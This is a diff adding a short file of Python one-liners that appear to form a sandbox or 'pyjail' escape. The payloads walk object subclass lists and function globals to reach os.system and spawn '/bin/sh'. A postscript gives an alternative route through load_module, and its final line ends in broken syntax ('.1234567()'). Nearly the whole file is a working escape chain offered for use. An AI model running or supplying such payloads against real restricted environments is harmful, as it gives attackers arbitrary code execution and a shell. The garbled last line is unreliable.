@@ -1,0 +1,10 @@
+(c:=__builtins__).update(b=c),(e:=().__class__).__class__('',(e,),c)
+(e:=().__class__).__subclasses__().pop().b.update(d=e.__base__.__subclasses__)
+(a:=().__class__.__subclasses__().pop().b).update(d=a.pop('d')().pop(133))
+(a:=().__class__.__subclasses__().pop().b).update(d=a.pop('d').__init__)
+(a:=().__class__.__subclasses__().pop().b).update(d=a.pop('d').__globals__)
+().__class__.__subclasses__().pop().b.pop('d').pop('system')('/bin/sh')
+
+
+P.S. `globals()['__builtins__'].__dict__.clear()` is needed otherwise:
+().__class__.__base__.__subclasses__().pop(84).load_module('builtins').1234567()
